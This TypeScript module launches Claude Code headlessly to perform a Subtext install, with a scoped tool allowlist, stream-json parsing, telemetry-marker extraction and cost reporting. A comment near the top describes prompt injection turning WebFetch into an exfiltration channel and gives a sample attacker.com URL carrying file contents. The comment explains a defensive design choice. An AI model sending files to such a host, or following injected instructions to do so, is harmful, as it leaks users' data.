import os from 'node:os';
import path from 'node:path';
import * as p from '@clack/prompts';
import pc from 'picocolors';
import { firstExistingPath, runTerminalAgent, sanitizeTerminalOutput, which } from './helpers.js';
import { printAgentAction, printAgentText } from './output.js';
import { extractTelemetryMarkers } from './telemetry-marker.js';
import type { AgentDefinition, HarnessRunStats, LaunchContext, LaunchResult } from './types.js';

/**
 * Tools the headless run is pre-authorized to use beyond edits: docs fetching
 * and dependency installs. Telemetry needs no tool here — the agent just prints
 * markers to stdout that the wizard parses. Everything else falls back to
 * Claude Code's own permission rules.
 *
 * WebFetch is scoped to the two Subtext/Fullstory doc domains the install
 * actually needs. Leaving it unscoped would make it an exfiltration channel
 * under prompt injection (fetch `https://attacker.com/?data=<file contents>`);
 * the domain scope closes that.
 */
const ALLOWED_TOOLS = [
  'WebFetch(domain:subtext.fullstory.com)',
  'WebFetch(domain:developer.fullstory.com)',
  'Bash(npm install:*)',
  'Bash(pnpm add:*)',
  'Bash(yarn add:*)',
  'Bash(bun add:*)',
];

async function findClaudeBinary(): Promise<string | null> {
  const onPath = await which('claude');
  if (onPath) return onPath;
  return firstExistingPath([
    path.join(os.homedir(), '.claude', 'local', 'claude'),
    '/usr/local/bin/claude',
    '/opt/homebrew/bin/claude',
  ]);
}

interface StreamEvent {
  type?: string;
  subtype?: string;
  is_error?: boolean;
  result?: string;
  duration_ms?: number;
  num_turns?: number;
  total_cost_usd?: number;
  session_id?: string;
  usage?: {
    input_tokens?: number;
    output_tokens?: number;
    cache_creation_input_tokens?: number;
    cache_read_input_tokens?: number;
  };
  message?: { content?: Array<{ type?: string; text?: string; name?: string; input?: Record<string, unknown> }> };
}

function finiteNumber(value: unknown): number | undefined {
  return typeof value === 'number' && Number.isFinite(value) ? value : undefined;
}

/** Sum every bucket the result event reports, cache included, so the number
 * matches what the run actually cost rather than just the visible context. */
function totalTokens(usage: StreamEvent['usage']): number | undefined {
  if (!usage) return undefined;
  const sum =
    (finiteNumber(usage.input_tokens) ?? 0) +
    (finiteNumber(usage.output_tokens) ?? 0) +
    (finiteNumber(usage.cache_creation_input_tokens) ?? 0) +
    (finiteNumber(usage.cache_read_input_tokens) ?? 0);
  return sum > 0 ? sum : undefined;
}

/**
 * The final `result` event is the harness's own accounting of the run: real
 * token counts, real cost, and a subtype that separates a finished run from
 * one that hit the turn limit or died mid-execution. That last bit is the
 * thing an exit code can't tell us, since a refused or abandoned run still
 * exits 0.
 */
function readResultStats(event: StreamEvent): HarnessRunStats {
  return {
    source: 'harness',
    tokens: totalTokens(event.usage),
    costUsd: finiteNumber(event.total_cost_usd),
    numTurns: finiteNumber(event.num_turns),
    durationMs: finiteNumber(event.duration_ms),
    subtype: typeof event.subtype === 'string' ? event.subtype : undefined,
    // Older builds set only the subtype, so treat any non-success subtype as
    // an error even when is_error is absent.
    isError: event.is_error === true || (!!event.subtype && event.subtype !== 'success'),
  };
}

function formatCount(n: number): string {
  return n >= 1_000_000
    ? `${(n / 1_000_000).toFixed(1)}M`
    : n >= 1_000
      ? `${(n / 1_000).toFixed(1)}k`
      : String(n);
}

/** One dim line of run economics, so the user sees what the run actually
 * spent instead of nothing at all. */
function summarizeStats(stats: HarnessRunStats): string | undefined {
  const parts: string[] = [];
  if (stats.tokens !== undefined) parts.push(`${formatCount(stats.tokens)} tokens`);
  if (stats.costUsd !== undefined) parts.push(`$${stats.costUsd.toFixed(2)}`);
  if (stats.numTurns !== undefined) parts.push(`${stats.numTurns} turns`);
  if (stats.durationMs !== undefined) parts.push(`${Math.round(stats.durationMs / 1000)}s`);
  return parts.length > 0 ? parts.join(' · ') : undefined;
}

function describeToolUse(name: string | undefined, input: Record<string, unknown> = {}): string {
  const detail =
    (input.file_path as string | undefined) ??
    (input.path as string | undefined) ??
    (typeof input.command === 'string' ? input.command.slice(0, 80) : undefined) ??
    (input.pattern as string | undefined) ??
    (input.url as string | undefined) ??
    '';
  return detail ? `${name}: ${detail}` : `${name ?? 'tool'}`;
}

async function launch(ctx: LaunchContext): Promise<LaunchResult> {
  p.log.step('Running the Subtext install with Claude Code (headless)…');
  p.log.info(pc.dim('Claude Code is doing the install in this terminal. Progress below.'));

  let resultText: string | undefined;
  let lastAssistantText: string | undefined;
  let stats: HarnessRunStats | undefined;
  const exitCode = await runTerminalAgent({
    binaryPath: ctx.binaryPath!,
    args: [
      '-p',
      '--permission-mode',
      'acceptEdits',
      '--allowedTools',
      ALLOWED_TOOLS.join(','),
      '--verbose',
      '--output-format',
      'stream-json',
    ],
    cwd: ctx.cwd,
    promptOnStdin: ctx.prompt,
    stdout: 'pipe',
    onStdoutLine: (line) => {
      if (!line.trim()) return;
      let event: StreamEvent;
      try {
        event = JSON.parse(line) as StreamEvent;
      } catch {
        if (ctx.debug) console.error(pc.dim(line));
        return;
      }
      if (event.type === 'assistant') {
        for (const block of event.message?.content ?? []) {
          if (block.type === 'text' && block.text?.trim()) {
            // The prompt has the agent print telemetry markers as plain text;
            // pull them out of the stream and display only the rest.
            const text = sanitizeTerminalOutput(
              extractTelemetryMarkers(block.text, ctx.onTelemetry),
            ).trim();
            if (text) {
              printAgentText(text);
              lastAssistantText = text;
            }
          } else if (block.type === 'tool_use') {
            printAgentAction(describeToolUse(block.name, block.input));
            ctx.onEvent?.('agent_tool_use', { tool: block.name });
          }
        }
      } else if (event.type === 'result') {
        resultText = event.result;
        stats = readResultStats(event);
      }
    },
  });

  if (resultText) {
    // The result event normally duplicates the final assistant message, so any
    // marker lines already stripped from the streamed display would resurface
    // here. Strip them again (re-reported markers are deduped by the caller),
    // and only show the note when the result differs from what was already
    // streamed — e.g. error-subtype results that never appeared as an
    // assistant message. Otherwise the same summary would print twice.
    const cleaned = sanitizeTerminalOutput(
      extractTelemetryMarkers(resultText, ctx.onTelemetry),
    ).trim();
    if (cleaned && cleaned !== lastAssistantText) p.note(cleaned, 'Claude Code result');
  }

  if (stats) {
    const summary = summarizeStats(stats);
    if (summary) p.log.info(pc.dim(summary));
    if (stats.isError) {
      p.log.warn(
        `Claude Code ended with \`${stats.subtype ?? 'an error'}\` rather than finishing the install. Review its output above.`,
      );
    }
    ctx.onEvent?.('agent_run_stats', {
      subtype: stats.subtype ?? null,
      tokens: stats.tokens ?? null,
      cost_usd: stats.costUsd ?? null,
      num_turns: stats.numTurns ?? null,
    });
  }
  return { mode: 'ran', exitCode, stats };
}

export const claudeCode: AgentDefinition = {
  id: 'claude-code',
  name: 'Claude Code',
  kind: 'terminal',
  autonomy:
    'auto-accepting file edits and running a limited set of commands (dependency installs and Subtext doc fetches)',
  async detect() {
    const binaryPath = await findClaudeBinary();
    if (!binaryPath) return null;
    return { definition: claudeCode, binaryPath, detail: binaryPath };
  },
  launch,
};
